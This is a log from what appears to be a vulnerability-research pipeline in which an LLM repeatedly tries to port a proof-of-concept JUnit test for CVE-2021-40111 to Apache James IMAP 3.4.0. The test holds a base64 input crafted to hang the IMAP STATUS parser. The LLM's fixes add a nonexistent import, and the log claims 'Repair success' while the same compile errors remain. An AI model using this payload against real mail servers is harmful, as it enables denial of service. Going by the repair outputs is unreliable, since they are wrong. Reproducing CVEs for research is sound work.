[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 144 (prompt), 9 (completion), 153 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, class edu.vision.se.Testcase1 

The test executes as expected in 3.5.0 

Error code:                         new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession())) 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
Tag;edu.vision.se.Testcase1
[96m[ErrorManager] Extracted key entities: ['Tag', 'edu.vision.se.Testcase1'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 28, 'column': 59, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'class edu.vision.se.Testcase1', 'code_line': '                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))'} with cause: ['Tag', 'edu.vision.se.Testcase1'][0m
[96m[Adapter] Related diffs for error: [(1367, 4.0), (1370, 4.0), (1371, 4.0), (1372, 4.0), (1373, 4.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['Tag', 'edu.vision.se.Testcase1'][0m
[96m[RepairModule] Trying best diff #1367 with score 4.00[0m
[96m[RepairModule] Iteration 0, temperature 1.000: Trying diff #1367 with score 4.00[0m
[LLMClient] Tokens used: 1488 (prompt), 488 (completion), 1976 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: class edu.vision.se.Testcase1

### Error Position:
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))

### Related Diff:
Operation: MODIFIED, File: mailbox/api/src/test/java/org/apache/james/mailbox/model/CidTest.java, Hunk: @@ -20,75 +20,72 @@
 package org.apache.james.mailbox.model;

 import static org.assertj.core.api.Assertions.assertThat;
-import static org.assertj.core.api.Assertions.assertThatThrownBy;

 import java.util.Optional;

+import org.junit.Rule;
+import org.junit.Test;
+import org.junit.rules.ExpectedException;
-import org.junit.jupiter.api.Test;

 import nl.jqno.equalsverifier.EqualsVerifier;

+public class CidTest {
+
+    @Rule public ExpectedException expectedException = ExpectedException.none();
-class CidTest {

     @Test
+    public void fromShouldThrowWhenNull() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from(null);
-    void fromShouldThrowWhenNull() {
-        assertThatThrownBy(() -> Cid.from(null))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenEmpty() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("");
-    void fromShouldThrowWhenEmpty() {
-        assertThatThrownBy(() -> Cid.from(""))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenBlank() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("    ");
-    void fromShouldThrowWhenBlank() {
-        assertThatThrownBy(() -> Cid.from("    "))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenEmptyAfterRemoveTags() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("<>");
-    void fromShouldThrowWhenEmptyAfterRemoveTags() {
-        assertThatThrownBy(() -> Cid.from("<>"))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenBlankAfterRemoveTags() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("<   >");
-    void fromShouldThrowWhenBlankAfterRemoveTags() {
-        assertThatThrownBy(() -> Cid.from("<   >"))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldRemoveTagsWhenExists() {
-    void fromShouldRemoveTagsWhenExists() {
         Cid cid = Cid.from("<123>");
         assertThat(cid.getValue()).isEqualTo("123");
     }

     @Test
+    public void fromShouldNotRemoveTagsWhenNone() {
-    void fromShouldNotRemoveTagsWhenNone() {
         Cid cid = Cid.from("123");
         assertThat(cid.getValue()).isEqualTo("123");
     }

     @Test
+    public void fromShouldNotRemoveTagsWhenNotEndTag() {
-    void fromShouldNotRemoveTagsWhenNotEndTag() {
         Cid cid = Cid.from("<123");
         assertThat(cid.getValue()).isEqualTo("<123");
     }

     @Test
+    public void fromShouldNotRemoveTagsWhenNotStartTag() {
-    void fromShouldNotRemoveTagsWhenNotStartTag() {
         Cid cid = Cid.from("123>");
         assertThat(cid.getValue()).isEqualTo("123>");
     }

     @Test
+    public void fromRelaxedNoUnwrapShouldReturnAbsentWhenNull() {
-    void fromRelaxedNoUnwrapShouldReturnAbsentWhenNull() {
         assertThat(Cid.parser()
             .relaxed()
             .parse(null))

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Based on the error and diff provided, I'll modify the test file to fix the compilation error by adding the missing Tag class import. Here's the modified version:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.message.Tag;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api.message[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #1367 at iteration 0![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api.message[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1938 (prompt), 1 (completion), 1939 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol
  symbol:   class Tag
  location: package org.apache.james.imap.api.message
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 4 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.126 s
[INFO] Finished at: 2025-07-13T15:39:38Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: package org.apache.james.imap.api.message
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 138 (prompt), 11 (completion), 149 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api.message 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.message.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.message.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 15, 'column': 41, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'package org.apache.james.imap.api.message', 'code_line': 'import org.apache.james.imap.api.message.Tag;'} with cause: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[96m[Adapter] Related diffs for error: [(1367, 4.0), (1370, 4.0), (1371, 4.0), (1372, 4.0), (1373, 4.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[96m[RepairModule] Trying best diff #1367 with score 4.00[0m
[96m[RepairModule] Iteration 0, temperature 1.000: Trying diff #1367 with score 4.00[0m
[LLMClient] Tokens used: 1492 (prompt), 505 (completion), 1997 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: package org.apache.james.imap.api.message

### Error Position:
import org.apache.james.imap.api.message.Tag;

### Related Diff:
Operation: MODIFIED, File: mailbox/api/src/test/java/org/apache/james/mailbox/model/CidTest.java, Hunk: @@ -20,75 +20,72 @@
 package org.apache.james.mailbox.model;

 import static org.assertj.core.api.Assertions.assertThat;
-import static org.assertj.core.api.Assertions.assertThatThrownBy;

 import java.util.Optional;

+import org.junit.Rule;
+import org.junit.Test;
+import org.junit.rules.ExpectedException;
-import org.junit.jupiter.api.Test;

 import nl.jqno.equalsverifier.EqualsVerifier;

+public class CidTest {
+
+    @Rule public ExpectedException expectedException = ExpectedException.none();
-class CidTest {

     @Test
+    public void fromShouldThrowWhenNull() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from(null);
-    void fromShouldThrowWhenNull() {
-        assertThatThrownBy(() -> Cid.from(null))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenEmpty() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("");
-    void fromShouldThrowWhenEmpty() {
-        assertThatThrownBy(() -> Cid.from(""))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenBlank() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("    ");
-    void fromShouldThrowWhenBlank() {
-        assertThatThrownBy(() -> Cid.from("    "))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenEmptyAfterRemoveTags() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("<>");
-    void fromShouldThrowWhenEmptyAfterRemoveTags() {
-        assertThatThrownBy(() -> Cid.from("<>"))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldThrowWhenBlankAfterRemoveTags() {
+        expectedException.expect(IllegalArgumentException.class);
+        Cid.from("<   >");
-    void fromShouldThrowWhenBlankAfterRemoveTags() {
-        assertThatThrownBy(() -> Cid.from("<   >"))
-            .isInstanceOf(IllegalArgumentException.class);
     }

     @Test
+    public void fromShouldRemoveTagsWhenExists() {
-    void fromShouldRemoveTagsWhenExists() {
         Cid cid = Cid.from("<123>");
         assertThat(cid.getValue()).isEqualTo("123");
     }

     @Test
+    public void fromShouldNotRemoveTagsWhenNone() {
-    void fromShouldNotRemoveTagsWhenNone() {
         Cid cid = Cid.from("123");
         assertThat(cid.getValue()).isEqualTo("123");
     }

     @Test
+    public void fromShouldNotRemoveTagsWhenNotEndTag() {
-    void fromShouldNotRemoveTagsWhenNotEndTag() {
         Cid cid = Cid.from("<123");
         assertThat(cid.getValue()).isEqualTo("<123");
     }

     @Test
+    public void fromShouldNotRemoveTagsWhenNotStartTag() {
-    void fromShouldNotRemoveTagsWhenNotStartTag() {
         Cid cid = Cid.from("123>");
         assertThat(cid.getValue()).isEqualTo("123>");
     }

     @Test
+    public void fromRelaxedNoUnwrapShouldReturnAbsentWhenNull() {
-    void fromRelaxedNoUnwrapShouldReturnAbsentWhenNull() {
         assertThat(Cid.parser()
             .relaxed()
             .parse(null))

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.message.Tag;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Based on the diff and compilation error, here's the modified test file:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
